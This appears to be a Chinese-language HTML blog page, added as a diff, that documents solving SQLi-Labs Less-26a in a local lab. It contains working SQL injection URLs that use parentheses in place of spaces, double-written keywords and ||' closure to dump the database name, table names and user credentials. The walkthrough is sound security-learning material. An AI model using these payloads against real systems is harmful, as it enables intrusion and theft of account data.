@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-26a 极致过滤下的联合查询 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-26a 极致过滤下的联合查询 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 绕过过滤, 联合查询</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-26a (GET - Trick with comments - String)</li>
+        <li><strong>提示：</strong>极致过滤，带括号的单引号闭合，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与绕过手法</h2>
+    <p>本关卡是 Less-26 的变种，过滤规则依旧极其严苛（过滤空格、注释符、逻辑关键字、反斜杠），但与 L26 的核心区别在于：<b>代码中注释掉了 <code>mysql_error()</code>，导致无法进行报错注入。</b></p>
+    <p>因此，本关必须使用 <b>联合查询（UNION SELECT）</b>，并面临以下挑战及绕过方式：</p>
+    <ul>
+        <li><strong>闭合方式</strong>：后端代码为 <code>id=('$id')</code>，需使用 <code>')</code> 进行闭合。</li>
+        <li><strong>无空格绕过</strong>：利用括号 <code>()</code> 作为天然的 Token 分隔符，代替空格。例如：<code>select(1),database()</code>。</li>
+        <li><strong>关键字绕过</strong>：双写 <code>infoorrmation_schema</code>、<code>passwoorrd</code>。</li>
+        <li><strong>无注释符与对称闭合</strong>：由于注释符被过滤，使用 <code>||'</code>（逻辑或）与原有的尾部单引号和括号强行缝合，形成合法的空字符串 <code>''</code>。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：爆库名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),database(),3||'</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>security</code>。</p>
+    <p><strong>解释与原理：</strong><code>0')</code> 闭合前置条件。末尾的 <code>3||'</code> 与后台原代码的 <code>') LIMIT 0,1</code> 拼接成了 <code>3||'') LIMIT 0,1</code>，语法完美闭环。</p>
+
+    <p><strong>第二步：爆表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),group_concat(table_name),(3)from(infoorrmation_schema.tables)where(table_schema=database())||'</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>emails,referers,uagents,users</code>。</p>
+    <p><strong>解释与原理：</strong>使用括号将 <code>select</code>、<code>group_concat</code>、<code>from</code> 等关键字隔开。双写 <code>infoorrmation</code> 绕过过滤。</p>
+
+    <p><strong>第三步：脱库拿账号密码</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=0')union(select(1),group_concat(username,0x3a,passwoorrd),(3)from(users)where(1=1)||'</code></p>
+    <p><strong>回显现象：</strong>成功爆出所有账号密码，包含 <code>Dumb:Dumb,Angelina:I-kill-you</code> 等。</p>
+    <p><strong>解释与原理：</strong>双写 <code>passwoorrd</code> 绕过对 <code>or</code> 的过滤。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>报错注入失效：</strong>不能盲目照搬 L26 的报错注入 Payload，必须先确认页面是否回显报错信息。</li>
+        <li><strong>括号的妙用：</strong>在空格被完全过滤的情况下，括号是解决词法解析边界问题的最佳选择。</li>
+        <li><strong>对称闭合精准度：</strong>无需使用注释符，精确计算出原代码的尾部结构，使用 <code>||'</code> 或 <code>&&'</code> 补全逻辑缺口。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>无报错回显下的联合查询：</strong>当报错被屏蔽时，必须回退到 UNION 联合查询。</li>
+        <li><strong>多种绕过技巧的融合：</strong>括号分隔、双写绕过、对称闭合，这三者是应对极致黑名单的三板斧。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
